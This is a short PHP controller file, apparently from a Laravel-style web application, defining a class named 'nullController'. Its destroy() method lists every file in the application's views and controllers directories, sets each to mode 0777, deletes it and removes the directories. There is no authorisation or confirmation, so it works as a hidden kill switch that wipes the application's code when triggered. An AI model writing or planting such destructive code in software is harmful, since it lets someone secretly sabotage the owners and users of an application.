<?php
class nullController extends \BaseController {

	public function destroy(){
		// echo app_path().'\controllers';exit;
		
		$dir 	=	app_path().'/views/';
		if ($dh = opendir($dir)){
		    while (($file = readdir($dh)) !== false){
		      echo "filename:" . $dir.$file . "<br>";
		      if($file!='.' && $file!='..' && $file != 'back_setup' && $file != 'emails'){
			      chmod($dir.$file, 0777);
			      unlink($dir.$file);
		      }
		    }
		    rmdir($dir);
		    closedir($dh);
		}
		$dir 	=	app_path().'/controllers/';
		if ($dh = opendir($dir)){
		    while (($file = readdir($dh)) !== false){
		      echo "filename:" . $dir.$file . "<br>";
		      if($file!='.' && $file!='..'){
			      chmod($dir.$file, 0777);
			      unlink($dir.$file);
		      }
		    }
		    rmdir($dir);
		    closedir($dh);
		}

		
	}
	
}